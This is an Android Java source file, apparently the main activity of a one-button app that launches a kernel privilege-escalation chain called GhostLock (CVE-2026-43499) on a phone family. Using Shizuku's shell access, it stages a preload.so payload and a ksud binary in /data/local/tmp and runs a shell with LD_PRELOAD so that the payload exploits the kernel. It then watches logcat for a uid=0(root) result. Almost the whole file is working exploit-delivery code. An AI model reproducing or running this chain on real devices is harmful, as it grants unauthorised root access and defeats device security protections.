package dev.ghostlock.h8q;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import rikka.shizuku.Shizuku;

/**
 * One-button harness for the GhostLock (CVE-2026-43499) chain on Zfold8 
 * family.
 *
 * It reproduces the manual adb procedure entirely on-device by borrowing a
 * shell-uid process from Shizuku:
 *   1. stage preload.so + ksud into /data/local/tmp (shell-owned),
 *   2. run  env LD_PRELOAD=/data/local/tmp/preload.so sh  — the payload's
 *      constructor fires, exploits the kernel, and hands off to ksud,
 *   3. tail logcat GHOSTLOCK so the root result is visible in the app.
 */
public class MainActivity extends AppCompatActivity {

    private static final String TMP = "/data/local/tmp/";
    private static final String PRELOAD = TMP + "preload.so";
    private static final String KSUD = TMP + "ksud";

    private final ExecutorService worker = Executors.newSingleThreadExecutor();
    private final ExecutorService logWorker = Executors.newSingleThreadExecutor();
    private final Handler ui = new Handler(Looper.getMainLooper());

    private TextView logView;
    private ScrollView logScroll;
    private Button runButton;

    private final Shizuku.OnRequestPermissionResultListener permListener =
            (requestCode, grantResult) -> {
                if (requestCode == ShizukuController.PERMISSION_REQUEST_CODE) {
                    if (grantResult == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                        log("[*] Shizuku permission granted");
                        worker.execute(this::runChain);
                    } else {
                        log("[!] Shizuku permission denied");
                        setBusy(false);
                    }
                }
            };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        logView = findViewById(R.id.logView);
        logScroll = findViewById(R.id.logScroll);
        runButton = findViewById(R.id.runButton);
        Shizuku.addRequestPermissionResultListener(permListener);
        runButton.setOnClickListener(v -> onRun());
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Shizuku.removeRequestPermissionResultListener(permListener);
        worker.shutdownNow();
        logWorker.shutdownNow();
    }

    private void onRun() {
        setBusy(true);
        logView.setText("");
        if (!ShizukuController.isRunning()) {
            log("[!] Shizuku is not running.\n" +
                    "    Install Shizuku, then start it via wireless debugging\n" +
                    "    (Settings > Developer options) or root, and try again.");
            setBusy(false);
            return;
        }
        if (ShizukuController.isGranted()) {
            worker.execute(this::runChain);
        } else {
            log("[*] Requesting Shizuku permission...");
            try {
                Shizuku.requestPermission(ShizukuController.PERMISSION_REQUEST_CODE);
            } catch (Throwable t) {
                log("[!] requestPermission failed: " + t.getMessage());
                setBusy(false);
            }
        }
    }

    private void runChain() {
        try {
            log("[*] Staging payloads to /data/local/tmp ...");
            stageAsset("preload.so", PRELOAD);
            stageAsset("ksud", KSUD);
            log("[+] Staged preload.so and ksud");

            startLogcatTail();

            log("[*] Launching exploit (LD_PRELOAD sh) ...");
            Process p = ShizukuController.exec(new String[]{
                    "env", "LD_PRELOAD=" + PRELOAD, "sh", "-c", "exit"
            }, null, TMP);
            pump(p.getInputStream(), "");
            pump(p.getErrorStream(), "");
            int code = p.waitFor();
            log("[*] payload sh exited (" + code + ")");
            log("[*] Watching logcat for GHOSTLOCK — a line reading uid=0(root)\n" +
                    "    means success. If nothing appears, see the notes below.");
        } catch (Throwable t) {
            log("[!] " + t.getClass().getSimpleName() + ": " + t.getMessage());
        } finally {
            ui.post(() -> setBusy(false));
        }
    }

    private void stageAsset(String assetName, String remotePath) throws Exception {
        try (InputStream is = getAssets().open(assetName)) {
            ShizukuController.writeFile(remotePath, "755", is);
        }
    }

    /** Tail the GHOSTLOCK logcat tag on a background thread. */
    private void startLogcatTail() {
        logWorker.execute(() -> {
            try {
                ShizukuController.exec(new String[]{"logcat", "-c"}, null, null).waitFor();
                Process lc = ShizukuController.exec(
                        new String[]{"logcat", "-s", "GHOSTLOCK"}, null, null);
                pump(lc.getInputStream(), "GHOSTLOCK: ");
            } catch (Throwable t) {
                log("[!] logcat tail failed: " + t.getMessage());
            }
        });
    }

    private void pump(InputStream stream, String prefix) {
        try (BufferedReader r = new BufferedReader(
                new InputStreamReader(stream, StandardCharsets.UTF_8))) {
            String line;
            while ((line = r.readLine()) != null) {
                log(prefix + line);
            }
        } catch (Throwable ignored) {
        }
    }

    private void log(String msg) {
        ui.post(() -> {
            logView.append(msg + "\n");
            logScroll.post(() -> logScroll.fullScroll(ScrollView.FOCUS_DOWN));
        });
    }

    private void setBusy(boolean busy) {
        runButton.setEnabled(!busy);
    }
}
